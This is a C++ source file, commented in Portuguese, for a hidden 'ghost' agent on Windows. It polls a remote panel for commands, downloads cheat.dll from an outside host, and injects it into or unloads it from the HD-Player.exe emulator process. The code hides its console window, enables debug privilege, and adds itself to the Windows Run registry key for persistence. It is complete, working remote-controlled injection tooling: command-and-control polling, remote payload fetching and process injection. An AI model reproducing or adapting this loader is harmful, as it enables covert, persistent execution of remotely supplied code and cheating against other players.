// ─── Ghost Agent ───────────────────────────────────────────────
// Aplicativo fantasma que roda em background, conecta ao Render
// e injeta/unload o cheat no HD-Player.exe sob comando remoto.
//
// Uso: ghost.exe --server=https://render-cheat-panel.onrender.com
//      (ou edita as constantes abaixo e compila)

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <cstdio>
#include <cstdlib>

#include "injector.h"
#include "network.h"
#include <vector>

// ─── CONFIG ────────────────────────────────────────────────────
// Config default - pode ser sobrescrita via argumentos ou arquivo
const wchar_t* DEFAULT_SERVER   = L"render-cheat-panel.onrender.com";
const int      DEFAULT_PORT     = 443;  // 443 para https
const bool     DEFAULT_HTTPS    = true;
const char*    TARGET_PROCESS   = "HD-Player.exe";
const char*    DLL_FILENAME     = "cheat.dll";
const char*    GHOST_ID_FILE    = "ghost_id.txt";
const int      POLL_INTERVAL_MS = 2000;

// ─── URL da DLL ──────────────────────────────────────────────
// Onde o ghost baixa a cheat.dll. Hospedado no uguu.se (278KB).
// Se quiser mudar pro GitHub ou render server, troca aqui.
const char*    DLL_DOWNLOAD_URL = "https://render-cheat-panel.onrender.com/cheat.dll";

// ─── Embedded DLL support ────────────────────────────────────
// Se compilado com -DCHEAT_DLL_EMBEDDED, inclui loader.h com bytes da DLL
#ifdef CHEAT_DLL_EMBEDDED
#include "loader.h"
#endif

// ─── helpers ──────────────────────────────────────────────────
std::string wstring_to_string(const std::wstring& wstr) {
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    if (len <= 0) return "";
    std::string str(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], len, NULL, NULL);
    return str;
}

std::wstring string_to_wstring(const std::string& str) {
    int len = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    if (len <= 0) return L"";
    std::wstring wstr(len - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], len);
    return wstr;
}

// ─── get ghost ID ─────────────────────────────────────────────
// fixo em "default" — um ghost por PC, o painel sempre envia pra esse ID
std::string get_ghost_id() {
    return "default";
}

// ─── save injected PID ────────────────────────────────────────
void save_injected_pid(DWORD pid) {
    FILE* f = NULL;
    if (fopen_s(&f, "injected.txt", "w") == 0 && f) {
        fprintf(f, "%lu", pid);
        fclose(f);
    }
}

DWORD load_injected_pid() {
    FILE* f = NULL;
    if (fopen_s(&f, "injected.txt", "r") == 0 && f) {
        DWORD pid = 0;
        if (fscanf_s(f, "%lu", &pid) == 1) {
            fclose(f);
            return pid;
        }
        fclose(f);
    }
    return 0;
}

// ─── send status to server ────────────────────────────────────
bool send_status(const std::string& server_host, int port, bool https,
                 const std::string& ghost_id, const std::string& status,
                 const std::string& extra) {
    char body[512];
    sprintf_s(body,
        "{\"id\":\"%s\",\"status\":\"%s\",\"extra\":\"%s\",\"target\":\"%s\"}",
        ghost_id.c_str(), status.c_str(), extra.c_str(), TARGET_PROCESS);
    
    std::string resp = http_post(string_to_wstring(server_host).c_str(),
                                 port,
                                 L"/api/ghost/status",
                                 body,
                                 https);
    return !resp.empty();
}

// ─── poll for command ─────────────────────────────────────────
std::string poll_command(const std::string& server_host, int port, bool https,
                          const std::string& ghost_id) {
    char path[256];
    sprintf_s(path, "/api/ghost/poll?id=%s", ghost_id.c_str());
    
    std::string resp = http_get(string_to_wstring(server_host).c_str(),
                                 port,
                                 string_to_wstring(path).c_str(),
                                 https);
    
    if (resp.empty()) return "";
    
    // parse command
    std::string cmd = json_get_string(resp, "command");
    return cmd;
}

// ─── main loop (inner — sem __try pra permitir C++ objects) ──
static int run_inner(const std::string& server_host, int port, bool https) {
    enable_debug_privilege();
    printf("[ghost] debug privilege OK\r\n");
    
    std::string ghost_id = get_ghost_id();
    bool injected = false;
    DWORD last_pid = 0;
    int heartbeat_count = 0;
    
    printf("[ghost] ghost_id=%s\r\n", ghost_id.c_str());
    
    // report online imediatamente
    printf("[ghost] sending online status...\r\n");
    bool status_ok = send_status(server_host, port, https, ghost_id, "online", "ghost agent started");
    printf("[ghost] status sent: %s\r\n", status_ok ? "OK" : "FAILED");
    
    // loop principal de polling
    int loop_count = 0;
    while (true) {
        loop_count++;
        // check if target process is running
        DWORD pid = find_process(TARGET_PROCESS);
        
        if (loop_count % 10 == 0) {
            printf("[ghost] polling... loop=%d pid=%lu\r\n", loop_count, pid);
        }
    
    // poll for command
    std::string command = poll_command(server_host, port, https, ghost_id);
    
    if (!command.empty()) {
        printf("[ghost] command received: %s\r\n", command.c_str());
    }
    
    // heartbeat a cada 5 polls (10s)
    heartbeat_count++;
    if (command.empty() && heartbeat_count >= 5) {
        heartbeat_count = 0;
        char extra[128];
        if (injected) sprintf_s(extra, "injected PID: %lu", last_pid);
        else if (pid > 0) sprintf_s(extra, "running PID: %lu", pid);
        else sprintf_s(extra, "waiting for %s", TARGET_PROCESS);
        send_status(server_host, port, https, ghost_id,
                    injected ? "injected" : (pid > 0 ? "idle" : "online"),
                    extra);
    }
    
    // process command
    if (command == "load" || command == "inject") {
        printf("[ghost] injecting...\r\n");
        
        // avisa que vai comecar
        send_status(server_host, port, https, ghost_id, "loading", "baixando DLL...");
        
        InjectionResult res = { false, 0, NULL, "" };
        std::vector<BYTE> dll_bytes;
        
        // ─── PRIMEIRO: tentar bytes embutidos (loader.h) ──
#ifdef CHEAT_DLL_EMBEDDED
        printf("[ghost] usando DLL embutida (%zu bytes)\r\n", cheat_dll_size);
        dll_bytes.assign(cheat_dll_bytes, cheat_dll_bytes + cheat_dll_size);
#else
        printf("[ghost] sem DLL embutida, tentando download...\r\n");
#endif
        
        // ─── SEGUNDO: tentar download da URL ────────────
        if (dll_bytes.empty()) {
            printf("[ghost] baixando DLL de: %s\r\n", DLL_DOWNLOAD_URL);
            dll_bytes = http_get_binary_url(DLL_DOWNLOAD_URL);
        }
        
        // ─── TERCEIRO: tentar localhost:8080 ────────────
        if (dll_bytes.empty()) {
            printf("[ghost] download falhou, tentando localhost:8080...\r\n");
            dll_bytes = http_get_binary(L"127.0.0.1", 8080, L"/api/cheat/download", false);
        }
        
        // ─── QUARTO: tentar arquivo local ───────────────
        if (dll_bytes.empty()) {
            printf("[ghost] tentando cheat.dll local...\r\n");
            char path[MAX_PATH];
            GetModuleFileNameA(NULL, path, MAX_PATH);
            char* sep = strrchr(path, '\\');
            if (sep) sep[1] = 0; else path[0] = 0;
            strcat_s(path, "cheat.dll");
            
            FILE* f = NULL;
            if (fopen_s(&f, path, "rb") == 0 && f) {
                fclose(f);
                res = inject_dll(TARGET_PROCESS, path);
            } else {
                sprintf_s(res.msg, "cheat.dll nao encontrada (todas as fontes falharam)");
            }
        }
        
        // ─── INJETAR via temp file ─────────────────────
        if (!dll_bytes.empty()) {
            char tmp[MAX_PATH], tmpf[MAX_PATH];
            GetTempPathA(MAX_PATH, tmp);
            DWORD r = GetTickCount() ^ (DWORD)(ULONG_PTR)GetModuleHandleA(NULL);
            sprintf_s(tmpf, "%s\\tmp%08X.dll", tmp, r);
            
            FILE* f = NULL;
            if (fopen_s(&f, tmpf, "wb") == 0 && f) {
                fwrite(dll_bytes.data(), 1, dll_bytes.size(), f);
                fclose(f);
                printf("[ghost] DLL salva em temp (%zu bytes)\r\n", dll_bytes.size());
                res = inject_dll(TARGET_PROCESS, tmpf);
                DeleteFileA(tmpf);
            } else {
                sprintf_s(res.msg, "erro ao criar temp file");
            }
        }
        
        if (res.success) {
            printf("[ghost] inject OK: %s\r\n", res.msg);
            injected = true;
            last_pid = res.pid;
            save_injected_pid(res.pid);
            
            char extra[128];
            sprintf_s(extra, "injetado PID: %lu", res.pid);
            send_status(server_host, port, https, ghost_id, "injected", extra);
        } else {
            printf("[ghost] inject FAILED: %s\r\n", res.msg);
            send_status(server_host, port, https, ghost_id, "error", res.msg);
        }
    }
    else if (command == "unload" || command == "eject") {
        printf("[ghost] unloading...\r\n");
        InjectionResult res = unload_dll(TARGET_PROCESS, DLL_FILENAME);
        if (res.success) {
            printf("[ghost] unload OK: %s\r\n", res.msg);
            injected = false;
            last_pid = 0;
            send_status(server_host, port, https, ghost_id, "unloaded", DLL_FILENAME);
        } else {
            // try unload by saved PID with different dll name
            InjectionResult res2 = unload_dll(TARGET_PROCESS, "Client.dll");
            if (res2.success) {
                injected = false;
                last_pid = 0;
                send_status(server_host, port, https, ghost_id, "unloaded", "Client.dll");
            } else {
                send_status(server_host, port, https, ghost_id, "error", res.msg);
            }
        }
    }
    else if (command == "status") {
        char extra[128];
        if (injected) sprintf_s(extra, "injected PID: %lu", last_pid);
        else if (pid > 0) sprintf_s(extra, "running PID: %lu (not injected)", pid);
        else sprintf_s(extra, "process not running");
        send_status(server_host, port, https, ghost_id,
                    injected ? "injected" : (pid > 0 ? "idle" : "waiting"),
                    extra);
    }
    
    Sleep(POLL_INTERVAL_MS);
    }
    
    return 0;
}

// ─── main loop (wrapper com SEH) ──────────────────────────────
int run(const std::string& server_host, int port, bool https) {
    // desativa buffer de stdout pra debug
    setvbuf(stdout, NULL, _IONBF, 0);
    
    printf("[ghost] starting...\r\n");
    printf("[ghost] server=%s port=%d https=%s\r\n",
           server_host.c_str(), port, https ? "yes" : "no");
    
    __try {
        return run_inner(server_host, port, https);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        printf("[ghost] CRASH: exception code 0x%08X\r\n", GetExceptionCode());
        printf("[ghost] presione ENTER para sair...\r\n");
        getchar();
        return 1;
    }
}

// ─── install startup ──────────────────────────────────────────
void install_startup() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        RegSetValueExA(hKey, "GhostAgent", 0, REG_SZ,
                       (BYTE*)path, (DWORD)strlen(path) + 1);
        RegCloseKey(hKey);
    }
}

// ─── entry point ──────────────────────────────────────────────
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    // hide console window
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
    
    // parse command line
    std::string server_host = wstring_to_string(std::wstring(DEFAULT_SERVER));
    int port = DEFAULT_PORT;
    bool https = DEFAULT_HTTPS;
    
    // very basic arg parsing
    char* cmd = lpCmdLine;
    if (cmd && *cmd) {
        // check for --server=xxx
        char* server_arg = strstr(cmd, "--server=");
        if (server_arg) {
            server_arg += 9; // skip "--server="
            char* end = strchr(server_arg, ' ');
            if (end) *end = 0;
            // remove quotes if any
            if (*server_arg == '"') {
                server_arg++;
                char* q = strchr(server_arg, '"');
                if (q) *q = 0;
            }
            server_host = server_arg;
        }
    }
    
    // register to startup
    install_startup();
    
    // run
    return run(server_host, port, https);
}

// ─── debug entry point (console) ──────────────────────────────
// compile com -DGHOST_CONSOLE para ter printf + console
#ifdef GHOST_CONSOLE
int main() {
    return WinMain(GetModuleHandleA(NULL), NULL, GetCommandLineA(), SW_SHOW);
}
#endif
